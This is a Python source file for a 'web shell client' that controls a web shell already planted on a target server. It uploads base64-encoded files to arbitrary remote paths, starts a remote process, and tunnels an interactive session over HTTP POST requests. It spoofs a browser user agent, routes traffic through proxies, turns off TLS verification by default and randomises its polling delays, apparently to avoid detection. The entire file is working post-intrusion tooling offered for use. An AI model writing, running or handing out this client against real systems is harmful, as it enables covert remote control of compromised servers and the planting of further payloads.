import sys
import select
import fcntl
import os
import requests
import base64
import random
import time
import argparse



BUFFER_RANDOM=5

key = None
headers = {}
proxies = {}

parser = argparse.ArgumentParser(description='Python web shell client.', conflict_handler='resolve', formatter_class=argparse.RawDescriptionHelpFormatter)

parser.add_argument('url', type=str, help='Target url')
parser.add_argument('key', type=str, help='Authentication key')
parser.add_argument('--no-buffer', action='store_const', help='Authentication key', const=True)
parser.add_argument("--run", type=str, help='Command to run instead of ssh')
parser.add_argument("--push", type=list, help='push a file on the remote filesystem: --push [src] [destination]', nargs=2)
parser.add_argument("--user-agent", type=str, help='Custom user agent', default='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36')

parser.add_argument("--proxy", '-x', type=str, help='Proxy')
parser.add_argument("--no-tls-verify", "-k", default=True, action='store_const', const=False)


def drop(pth, what, where, verify=True):
    with open(what, 'rb') as reader:
        r = reader.read(1024)
        c = r
        while len(r)==1024:
            r = reader.read()
        b64 = base64.b64encode(c)
        x = requests.post(pth, {"TODO": "DROP", "KEY": key, "WHAT":b64, "WHERE" : where}, headers=headers, proxies=proxies, timeout=7, verify=verify)
    
        
def run(pth, where, verify=True):
    x = requests.post(pth, {"TODO": "START", "KEY": key, "WHERE" : where}, headers=headers, proxies=proxies, timeout=7,  verify=verify)
    print(x.content)
    

def pull_data(pth, verify=True):
    x = requests.post(pth, {"TODO": "READ", "KEY":key}, headers=headers, proxies=proxies, timeout=7, verify=verify)
    if (not x or x.status_code == 201):
        print("sshd not running",  file=sys.stderr)
        sys.exit(-1)    
    if (x.content!=""):
        b = base64.b64decode(x.content)
    #sys.stderr.buffer.write(b)
    #sys.stderr.buffer.flush()
    sys.stdout.buffer.write(b)
    sys.stdout.buffer.flush()
    return


def write_data(pth,d, verify=True):
    b = base64.b64encode(d)
    x = requests.post(pth, {"TODO":"WRITE" , "DATA":b, "KEY": key}, headers=headers, proxies=proxies, verify=verify)
    #print(x.content, file=sys.stderr)
    return x.status_code

if __name__ == "__main__":
    args = parser.parse_args()
    key = args.key
    headers['User-Agent'] = args.user_agent
    if args.proxy:
        proxies["http"] = args.proxy
        proxies["https"] = args.proxy
    if not (args.push or args.run):        

        orig_fl = fcntl.fcntl(sys.stdin, fcntl.F_GETFL)
        fcntl.fcntl(sys.stdin, fcntl.F_SETFL, orig_fl | os.O_NONBLOCK)

        while True:
            i = [sys.stdin]
            if args.no_buffer:
                ins, _, _  = select.select(i, [], [], random.randint(1,5))
            else:
                timer = random.randint(1,BUFFER_RANDOM)
                time.sleep(timer)
                ins, _, _  = select.select(i, [], [], 0)
            if len(ins) != 0:
                x = sys.stdin.buffer.read()
                write_data(args.url,x,  verify=args.no_tls_verify)
            pull_data(args.url,  verify=args.no_tls_verify)
    if args.push:
        drop(args.url, args.push[0], args.push[1],  verify=args.no_tls_verify)

    elif args.run:
        run(args.url, args.run,  verify=args.no_tls_verify)


        
